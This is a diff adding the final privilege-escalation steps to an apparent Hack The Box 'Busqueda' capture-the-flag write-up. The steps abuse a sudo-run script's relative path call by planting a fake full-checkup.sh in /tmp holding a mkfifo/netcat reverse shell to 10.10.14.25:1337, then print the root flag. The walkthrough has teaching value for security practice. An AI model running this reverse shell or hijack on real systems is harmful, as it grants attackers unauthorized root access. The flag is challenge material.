@@ -490,7 +490,54 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}'
 
 20. Instead of using an absolute path for executing the full-checkup script, it using a relative path. Knowing this, means system-checkup shall executes full-checkup from the directory where system-checkup is executed.
 
-21. 
+21. Hence let's traverse to `/opt/scripts` so we can execute it.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cb68517e-9e81-4e84-ae38-d3a0a8035295)
+
+
+22. Great! Now let's make a **fake** full-checkup script which has our payload for privesc.
+
+> PRIVESC TEMPLATE PAYLOAD
+
+```sh
+echo -en "#! /bin/bash\nrm /tmp/privesc;mkfifo /tmp/privesc;cat /tmp/privesc|/bin/sh -i 2>&1|nc 10.10.14.25 1337 > /tmp/privesc" > /tmp/full-checkup.sh
+```
+
+> Make it executeable
+
+```sh
+chmod +x /tmp/full-checkup.sh
+```
+
+23. Set listener on port 1337, then execute system-checkup.
+
+```
+svc@busqueda:/tmp$ ls
+full-checkup.sh
+snap-private-tmp
+systemd-private-17829a12bc8b4ac8a1e618230932cccd-apache2.service-sW8QB7
+systemd-private-17829a12bc8b4ac8a1e618230932cccd-ModemManager.service-KjfjOT
+systemd-private-17829a12bc8b4ac8a1e618230932cccd-systemd-logind.service-TcOS07
+systemd-private-17829a12bc8b4ac8a1e618230932cccd-systemd-resolved.service-GzJRLa
+systemd-private-17829a12bc8b4ac8a1e618230932cccd-systemd-timesyncd.service-0iHEWc
+vmware-root_713-4290166671
+svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4ea9d8a4-919a-487c-b496-6df10a6321ba)
+
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/246eaf13-4bf0-430b-b4f1-403943bd759e)
+
+
+## ROOT FLAG
+
+```
+28ebc218fd8b925c15389edf5529c21f
+```
 
 
 
